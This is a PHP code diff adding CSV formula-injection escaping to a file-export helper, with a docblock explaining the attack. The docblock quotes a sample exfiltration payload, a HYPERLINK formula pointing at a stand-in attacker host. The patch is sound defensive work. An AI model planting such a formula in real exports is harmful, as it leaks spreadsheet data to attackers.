@@ -11,6 +11,16 @@ final class File
     public const APPEND = 'a';
 
     /**
+     * Characters that make a spreadsheet treat a cell as a formula.
+     */
+    private const CSV_FORMULA_TRIGGERS = '=+-@';
+
+    /**
+     * Leading bytes spreadsheet parsers skip before looking for a trigger.
+     */
+    private const CSV_LEADING_NOISE = " \t\r\n\v\f\0";
+
+    /**
      * Open a file stream for reading, writing, or appending.
      *
      * Primary use: CSV operations requiring stream-based processing.
@@ -58,7 +68,53 @@ final class File
         string $escape = '\\',
         string $eol = "\n"
     ) {
-        return fputcsv($stream, $fields, $separator, $enclosure, $escape, $eol);
+        return fputcsv($stream, array_map([self::class, 'escapeCsvFormula'], $fields), $separator, $enclosure, $escape, $eol);
+    }
+
+    /**
+     * Neutralise spreadsheet formula injection in a single CSV field.
+     *
+     * Spreadsheet applications evaluate a cell as a formula when its first
+     * meaningful character is =, +, - or @, so an attacker-supplied CRM value
+     * such as =HYPERLINK("http://evil/?x="&A1,"click") executes on the machine
+     * of whoever opens the export. Leading whitespace and control bytes are
+     * skipped before that check because parsers ignore them too, so " =1+1"
+     * is just as dangerous as "=1+1".
+     *
+     * Prefixing with a single quote forces the cell to be read as text; the
+     * quote itself is not displayed. Plain integers and decimals are exempt so
+     * negative numbers still import as numbers rather than text — note this is
+     * deliberately narrower than is_numeric(), which also accepts scientific
+     * notation and whitespace-padded values that could carry a payload.
+     *
+     * @param mixed $field Field value about to be written
+     *
+     * @return mixed Neutralised value, or the original when no escaping applies
+     */
+    public static function escapeCsvFormula($field)
+    {
+        if (!\is_string($field) && !\is_int($field) && !\is_float($field)) {
+            return $field;
+        }
+
+        $value = (string) $field;
+
+        if ($value === '' || self::isPlainNumber($value)) {
+            return $field;
+        }
+
+        // Already neutralised (for example a re-exported imported value).
+        if ($value[0] === "'") {
+            return $field;
+        }
+
+        $meaningful = ltrim($value, self::CSV_LEADING_NOISE);
+
+        if ($meaningful === '' || strpos(self::CSV_FORMULA_TRIGGERS, $meaningful[0]) === false) {
+            return $field;
+        }
+
+        return "'" . $value;
     }
 
     /**
@@ -129,5 +185,18 @@ final class File
     public static function removeDirectory(string $path): bool
     {
         return WPFilesystem::rmdir($path);
+    }
+
+    /**
+     * Whether a value is a plain integer or decimal, with no padding,
+     * exponent, or other notation a spreadsheet trigger could hide behind.
+     *
+     * @param string $value
+     *
+     * @return bool
+     */
+    private static function isPlainNumber($value)
+    {
+        return preg_match('/^[+-]?(?:\d+|\d*\.\d+)$/', $value) === 1;
     }
 }
